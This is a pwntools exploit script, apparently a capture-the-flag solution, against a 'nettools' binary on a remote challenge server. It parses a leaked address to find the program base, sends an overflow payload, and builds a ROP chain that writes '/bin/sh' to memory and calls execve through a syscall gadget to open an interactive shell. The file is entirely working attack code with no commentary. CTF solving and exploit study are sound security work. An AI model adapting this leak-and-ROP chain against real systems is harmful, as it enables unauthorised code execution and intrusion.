from pwn import *

context.binary = exe = ELF('./nettools')

#io = process()
#gdb.attach(io, api=True)
io = remote('chals.sekai.team', 4001)

# Gadgets
mov_ptr_rdi_rsi = 0x57ec7
pop_rdi = 0xa0ef
pop_rsi = 0x9c18
mov_rdx_rsi = 0x5f28e
pop_rax = 0xecaa
syscall = 0x0000000000025adf

io.recvuntil(b': 0x')
exe.address = int(io.recvline(), 16) - 0x7a03c
print(f'ELF base: {hex(exe.address)}')

io.recvuntil(b'> ')
io.sendline(b'3')
io.recvuntil(b': ')
bin_sh = exe.bss(0x200-0x30)
payload = b'i'*400 + b'\0'*344
payload += p64(exe.address+pop_rdi) + p64(bin_sh)
payload += p64(exe.address+pop_rsi) + p64(0x20)
payload += p64(exe.address+mov_ptr_rdi_rsi)
payload += p64(exe.address+pop_rdi) + p64(bin_sh+8)
payload += p64(exe.address+pop_rsi) + b'/bin/sh\0'
payload += p64(exe.address+mov_ptr_rdi_rsi)

payload += p64(exe.address+pop_rax) + p64(0x3b)
payload += p64(exe.address+pop_rdi) + p64(bin_sh+8)
payload += p64(exe.address+pop_rsi) + p64(0x0) + p64(exe.address+mov_rdx_rsi)
payload += p64(exe.address+syscall)

payload += p64(exe.address+pop_rdi+1) # Ret gadget
payload += p64(exe.sym['_ZN8nettools4main17hf6374d482834d6a5E']) # Back to main
io.sendline(payload)
io.interactive()